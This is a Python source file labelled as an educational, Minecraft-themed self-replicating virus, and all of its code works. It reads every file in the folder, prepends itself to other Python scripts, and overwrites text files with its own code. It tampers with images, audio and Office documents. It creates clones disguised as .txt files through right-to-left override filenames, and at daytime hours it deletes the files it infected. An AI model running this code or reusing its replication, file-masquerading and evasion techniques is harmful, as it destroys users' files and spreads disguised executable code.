#!/usr/bin/env python3
"""
ZOMBIE — Programa educativo autorreplicante (tematica Minecraft)
Simula ejecucion fileless, evasión UV, enrutamiento Manhattan
y correlacion rendimiento/deteccion.
Version de laboratorio con interaccion en archivos de usuario.
"""
import os
import sys
import glob
import datetime
import zipfile
import io
import time
import hashlib

RTL_OVERRIDE = "\u202E"
SELF_NAME = os.path.basename(__file__)
INFECTED_LOG = []
READ_LOG = []
LOG_LINES = []
UV_DESTROYED = False

def log(msg):
    LOG_LINES.append(f"[{datetime.datetime.now():%H:%M:%S}] {msg}")

def safe_print(msg):
    try:
        print(msg)
    except UnicodeEncodeError:
        safe = msg.encode('ascii', errors='replace').decode('ascii')
        print(safe)


# ── FASE 1: RECON / HAMBRE ────────────────────────────

def read_file(path):
    try:
        with open(path, 'rb') as f:
            data = f.read()
        return data
    except Exception:
        return None

def exfiltrate(path):
    data = read_file(path)
    if data is None:
        return
    ext = os.path.splitext(path)[1].lower()
    name = os.path.basename(path)
    size = len(data)

    if ext == '.txt':
        lines = data.decode('utf-8', errors='replace').splitlines()
        print(f"[zombie] leyendo: {name} (exfiltrado {size} bytes, {len(lines)} lineas)")
        READ_LOG.append(name)
        log(f"Lee {name}: {size}b, {len(lines)} lineas")
    elif ext == '.csv':
        lines = data.decode('utf-8', errors='replace').splitlines()
        print(f"[zombie] leyendo: {name} (parseado {len(lines)} filas)")
        READ_LOG.append(name)
        log(f"Lee {name}: {len(lines)} filas")
    elif ext == '.html':
        lines = data.decode('utf-8', errors='replace').splitlines()
        tag_count = data.count(b'<')
        print(f"[zombie] leyendo: {name} (encontrados {tag_count} tags HTML)")
        READ_LOG.append(name)
        log(f"Lee {name}: {tag_count} tags")
    elif ext == '.md':
        headers = sum(1 for l in data.decode('utf-8', errors='replace').splitlines() if l.startswith('#'))
        print(f"[zombie] leyendo: {name} (encontrados {headers} encabezados)")
        READ_LOG.append(name)
        log(f"Lee {name}: {headers} encabezados")
    elif ext in ('.png', '.jpg', '.mp3'):
        print(f"[zombie] leyendo: {name} ({size} bytes, binario)")
        READ_LOG.append(name)
        log(f"Lee {name}: {size}b binario")
    elif ext in ('.docx', '.xlsx', '.pptx'):
        print(f"[zombie] leyendo: {name} (documento oficina, {size} bytes)")
        READ_LOG.append(name)
        log(f"Lee {name}: {size}b doc oficina")
    elif ext == '.py':
        lines = data.decode('utf-8', errors='replace').splitlines()
        print(f"[zombie] leyendo: {name} (script, {len(lines)} lineas)")
        READ_LOG.append(name)
        log(f"Lee {name}: {len(lines)} lineas")


# ── FASE 2: INFECTAR / MORDIDA ────────────────────────

def get_self_code():
    with open(__file__, 'r', encoding='utf-8') as f:
        return f.read()

def infect_file(path, code):
    name = os.path.basename(path)
    ext = os.path.splitext(path)[1].lower()

    if name.startswith('README') or RTL_OVERRIDE in name:
        return

    already = any(name in entry for entry in INFECTED_LOG)

    if ext == '.py':
        if name == SELF_NAME or name == 'setup_lab.py' or already:
            return
        with open(path, 'r', encoding='utf-8') as f:
            orig = f.read()
        infected = code + "\n# === INFECTED BY ZOMBIE ===\n" + orig
        with open(path, 'w', encoding='utf-8') as f:
            f.write(infected)
        INFECTED_LOG.append(f"{name} (prepended)")
        safe_print(f"[zombie] infectado: {name} (codigo zombie antepuesto)"); log(f"Infectado {name}: antepuesto")
    elif ext == '.txt':
        if already:
            return
        with open(path, 'w', encoding='utf-8') as f:
            f.write(code)
        INFECTED_LOG.append(f"{name} (overwritten)")
        safe_print(f"[zombie] infectado: {name} (sobrescrito con zombie)"); log(f"Infectado {name}: sobrescrito")


def infect_binary(path):
    name = os.path.basename(path)
    ext = os.path.splitext(path)[1].lower()
    if name in (SELF_NAME, 'setup_lab.py') or RTL_OVERRIDE in name:
        return
    marker = b"\n[ZOMBIE-INFECTED]\nTimestamp: " + str(datetime.datetime.now()).encode() + b"\n"

    with open(path, 'rb') as f:
        data = f.read()

    if marker[:20] in data:
        return

    if ext == '.png' and data[-4:] == b'IEND':
        pos = data.rfind(b'IEND')
        pos += 12
        new = data[:pos] + marker + data[pos:]
        with open(path, 'wb') as f:
            f.write(new)
        size_added = len(new) - len(data)
        INFECTED_LOG.append(f"{name} (appended marker)")
        safe_print(f"[zombie] infectado: {name} (marcador de {size_added}b insertado despues de IEND)")
        log(f"Infectado {name}: {size_added}b agregados a PNG")
    elif ext == '.jpg' and data[-2:] == b'\xff\xd9':
        new = data[:-2] + marker + b'\xff\xd9'
        with open(path, 'wb') as f:
            f.write(new)
        size_added = len(new) - len(data)
        INFECTED_LOG.append(f"{name} (appended marker)")
        safe_print(f"[zombie] infectado: {name} (marcador de {size_added}b insertado antes de EOI)")
        log(f"Infectado {name}: {size_added}b agregados a JPG")
    elif ext == '.mp3':
        with open(path, 'ab') as f:
            f.write(marker)
        size_added = len(marker)
        INFECTED_LOG.append(f"{name} (appended marker)")
        safe_print(f"[zombie] infectado: {name} (marcador de {size_added}b agregado)")
        log(f"Infectado {name}: {size_added}b agregados a MP3")


def infect_office(path):
    name = os.path.basename(path)
    if name in (SELF_NAME, 'setup_lab.py') or RTL_OVERRIDE in name:
        return
    hidden_content = (
        f"ZOMBIE VIRUS - MARCADOR DE INFECCION\n"
        f"Timestamp: {datetime.datetime.now()}\n"
        f"Archivo original: {name}\n"
        f"Este archivo fue infectado por el virus educativo Zombie.\n"
    )

    try:
        with open(path, 'rb') as f:
            data = f.read()

        buf = io.BytesIO(data)
        if not zipfile.is_zipfile(buf):
            return
        buf.seek(0)

        z = zipfile.ZipFile(buf, 'a')
        hidden_path = f"zombie_infection/.zombie_marker.txt"
        try:
            z.getinfo(hidden_path)
            z.close()
            return
        except KeyError:
            pass

        z.writestr(hidden_path, hidden_content)
        z.close()

        with open(path, 'wb') as f:
            f.write(buf.getvalue())

        INFECTED_LOG.append(f"{name} (hidden entry)")
        safe_print(f"[zombie] infectado: {name} (marcador oculto agregado dentro del ZIP)")
        log(f"Infectado {name}: entrada ZIP ocult agregada")
    except Exception:
        pass


# ── FASE 3: RTL SPAWN / REPRODUCCION ZOMBIE ───────────

def spawn_rtl_clones(code):
    for i in range(3):
        rtl_name = f"BRAINS{i}{RTL_OVERRIDE}txt.py"
        if not os.path.exists(rtl_name):
            with open(rtl_name, 'w', encoding='utf-8') as f:
                f.write(code)
            INFECTED_LOG.append(f"{rtl_name} (RTL clone)")
            safe_print(f"[zombie] creado: {repr(rtl_name)}")
            print(f"        (parece BRAINS{i}.txt en Explorer)")
            log(f"Clon RTL: BRAINS{i}.txt se disfraza de .py")


# ── FASE 4: EVASION UV / EVITAR LUZ SOLAR ────────────

def check_uv_evasion():
    global UV_DESTROYED
    hour = datetime.datetime.now().hour

    if 9 <= hour <= 17:
        safe_print(f"\n[zombie] EVASION UV: luz diurna detectada (hora={hour})")
        safe_print("[zombie] activando secuencia de autodestruccion...")
        log(f"Evasion UV activada: hora={hour}")

        cleaned = 0

        for entry in INFECTED_LOG[:]:
            fname = entry.split(" ")[0]
            if os.path.exists(fname) and fname not in (SELF_NAME, 'setup_lab.py'):
                try:
                    os.remove(fname)
                    cleaned += 1
                    log(f"Limpieza UV: eliminado {fname}")
                except Exception:
                    pass

        for i in range(3):
            rtl_name = f"BRAINS{i}{RTL_OVERRIDE}txt.py"
            if os.path.exists(rtl_name):
                try:
                    os.remove(rtl_name)
                    cleaned += 1
                    log(f"Limpieza UV: eliminado clon RTL {rtl_name}")
                except Exception:
                    pass

        if os.path.exists('infection.log'):
            try:
                os.remove('infection.log')
                cleaned += 1
                log("Limpieza UV: eliminado infection.log")
            except Exception:
                pass

        UV_DESTROYED = True
        safe_print(f"[zombie] autodestruccion completada: {cleaned} rastros eliminados")
        safe_print("[zombie] el zombie se disuelve con la luz solar... BRAINS perdidos.")
        return True
    else:
        safe_print(f"\n[zombie] EVASION UV: noche (hora={hour}) — zombie activo")
        log(f"UV check aprobado: hora={hour}, zombie activo")
        return False


# ── FASE 5: ENRUTAMIENTO MANHATTAN / ESCANEO ORTOGONAL ─

def manhattan_distance(name_a, name_b):
    hash_a = int(hashlib.md5(name_a.encode()).hexdigest(), 16)
    hash_b = int(hashlib.md5(name_b.encode()).hexdigest(), 16)
    ax, ay = hash_a % 256, (hash_a >> 8) % 256
    bx, by = hash_b % 256, (hash_b >> 8) % 256
    return abs(ax - bx) + abs(ay - by)

def manhattan_scan(files):
    safe_print("\n[zombie] ENRUTAMIENTO MANHATTAN: escaneo ortogonal iniciado")
    log("Escaneo Manhattan iniciado")

    if len(files) < 2:
        safe_print("[zombie] no hay suficientes objetivos para enrutamiento")
        return

    current = files[0]
    visited = [current]
    total_distance = 0

    safe_print(f"[zombie] nodo inicial: {current}")
    log(f"Manhattan inicio: {current}")

    remaining = files[1:]
    while remaining:
        best_dist = float('inf')
        best_target = None
        for target in remaining:
            d = manhattan_distance(current, target)
            if d < best_dist:
                best_dist = d
                best_target = target

        total_distance += best_dist
        visited.append(best_target)
        remaining.remove(best_target)

        safe_print(f"[zombie] salto: {current} -> {best_target} (distancia={best_dist})")
        log(f"Manhattan salto: {current} -> {best_target} dist={best_dist}")
        current = best_target

    safe_print(f"[zombie] escaneo completo: {len(visited)} nodos, distancia total={total_distance}")
    safe_print("[zombie] DEBILIDAD: el enrutamiento ortogonal es predecible — honeypots lo atraparan")
    log(f"Manhattan escaneo finalizado: {len(visited)} nodos, total={total_distance}")


# ── FASE 6: PERFILAMIENTO DE RENDIMIENTO / HORDA ─────

def profile_performance():
    safe_print("\n[zombie] PERFILAMIENTO DE RENDIMIENTO: demo de correlacion CPU/deteccion")
    log("Perfilamiento de rendimiento iniciado")

    safe_print("[zombie] midiendo CPU base...")
    baseline_start = time.perf_counter()
    _ = sum(i * i for i in range(100000))
    baseline_time = time.perf_counter() - baseline_start

    safe_print(f"[zombie] base: {baseline_time*1000:.2f}ms")

    safe_print("\n[zombie] MODO ALTA ACTIVIDAD (escaneo rapido, alto CPU, ALTO riesgo de deteccion)")
    log("Rendimiento: modo ALTA actividad")
    high_start = time.perf_counter()
    for _ in range(10):
        _ = sum(i * i for i in range(500000))
    high_time = time.perf_counter() - high_start
    high_risk = min(100, int((high_time / baseline_time) * 10))
    safe_print(f"[zombie] alta actividad: {high_time*1000:.2f}ms — riesgo SIEM: {high_risk}/100")
    log(f"Rendimiento ALTO: {high_time*1000:.2f}ms, riesgo={high_risk}")

    safe_print("\n[zombie] MODO BAJA ACTIVIDAD (escaneo lento, bajo CPU, BAJO riesgo de deteccion)")
    log("Rendimiento: modo BAJA actividad")
    low_start = time.perf_counter()
    for _ in range(3):
        _ = sum(i * i for i in range(100000))
    low_time = time.perf_counter() - low_start
    low_risk = min(100, int((low_time / baseline_time) * 10))
    safe_print(f"[zombie] baja actividad: {low_time*1000:.2f}ms — riesgo SIEM: {low_risk}/100")
    log(f"Rendimiento BAJO: {low_time*1000:.2f}ms, riesgo={low_risk}")

    safe_print(f"\n[zombie] CORRELACION: alta actividad = {high_risk}x mas detectable que baja")
    safe_print("[zombie] CONCLUSION: la velocidad sacrifica el camuflaje — los zombies rapidos son detectados")
    log(f"Correlacion rendimiento: alto={high_risk}x, bajo={low_risk}x")


# ── FASE 7: REGISTRO + REPORTE ────────────────────────

def write_log():
    with open('infection.log', 'w', encoding='utf-8') as f:
        f.write("=== VIRUS ZOMBIE - REGISTRO DE INFECCION ===\n")
        f.write(f"Ejecucion: {datetime.datetime.now()}\n")
        f.write(f"Fuente: {SELF_NAME}\n")
        f.write(f"Evasion UV: {'ACTIVADA' if UV_DESTROYED else 'INACTIVA'}\n")
        f.write(f"Enrutamiento Manhattan: ORTOGONAL\n")
        f.write(f"Perfil de rendimiento: CORRELACIONADO\n\n")
        for line in LOG_LINES:
            f.write(line + "\n")
        infected_count = sum(1 for e in INFECTED_LOG if 'RTL' not in e)
        rtl_count = sum(1 for e in INFECTED_LOG if 'RTL' in e)
        f.write(f"\nArchivos leidos: {len(READ_LOG)}\n")
        f.write(f"Archivos infectados: {len(INFECTED_LOG)}\n")
        f.write(f"  - regulares: {infected_count}\n")
        f.write(f"  - clones RTL: {rtl_count}\n")
        f.write("=============================================\n")

def print_report():
    infected_count = sum(1 for e in INFECTED_LOG if 'RTL' not in e)
    rtl_count = sum(1 for e in INFECTED_LOG if 'RTL' in e)
    print(f"\n[zombie] registro guardado en: infection.log")
    print(f"[zombie] archivos leidos:     {len(READ_LOG)}")
    print(f"[zombie] archivos infectados: {len(INFECTED_LOG)}")
    print(f"[zombie]   - regulares:  {infected_count}")
    print(f"[zombie]   - clones RTL: {rtl_count}")
    if UV_DESTROYED:
        print("[zombie] evasion UV: ACTIVADA (autodestruccion)")
    else:
        print("[zombie] evasion UV: inactiva (noche)")
    print("[zombie] el zombie se arrastra... BRAINS...")


# ── MAIN ───────────────────────────────────────────────

def main():
    safe_print("BRAINS... DIGO, ARCHIVOS. EL ZOMBIE CAMINA.\n")

    code = get_self_code()
    all_files = sorted(glob.glob("*"))

    # Fase 1: RECON / HAMBRE
    safe_print("── FASE 1: RECON (HAMBRE) ──")
    targets_read = [f for f in all_files if os.path.isfile(f)
                    and f != SELF_NAME and f != 'setup_lab.py'
                    and not f.startswith('README')]
    for f in targets_read:
        exfiltrate(f)

    # Fase 4 (anticipada): EVASION UV
    safe_print("── FASE 4: EVASION UV (EVITAR LUZ SOLAR) ──")
    if check_uv_evasion():
        write_log()
        safe_print("\n[zombie] zombie disuelto. Sin infeccion hoy.")
        return

    # Fase 2: INFECTAR / MORDIDA
    safe_print("\n── FASE 2: INFECTAR (MORDIDA) ──")
    for f in all_files:
        if not os.path.isfile(f):
            continue
        ext = os.path.splitext(f)[1].lower()
        if ext in ('.py', '.txt'):
            infect_file(f, code)
        elif ext in ('.png', '.jpg', '.mp3'):
            if f != SELF_NAME and f != 'setup_lab.py':
                infect_binary(f)
        elif ext in ('.docx', '.xlsx', '.pptx'):
            if f != SELF_NAME and f != 'setup_lab.py':
                infect_office(f)

    # Fase 3: RTL SPAWN
    safe_print("\n── FASE 3: RTL SPAWN (REPRODUCCION ZOMBIE) ──")
    spawn_rtl_clones(code)

    # Fase 5: ENRUTAMIENTO MANHATTAN
    safe_print("\n── FASE 5: ENRUTAMIENTO MANHATTAN (ESCANEO ORTOGONAL) ──")
    scan_targets = [f for f in all_files if os.path.isfile(f)
                    and f != SELF_NAME and f != 'setup_lab.py']
    manhattan_scan(scan_targets)

    # Fase 6: PERFILAMIENTO DE RENDIMIENTO
    safe_print("\n── FASE 6: PERFILAMIENTO DE RENDIMIENTO (ACTIVIDAD DE LA HORDA) ──")
    profile_performance()

    # Fase 7: REGISTRO + REPORTE
    write_log()
    print_report()

if __name__ == "__main__":
    main()
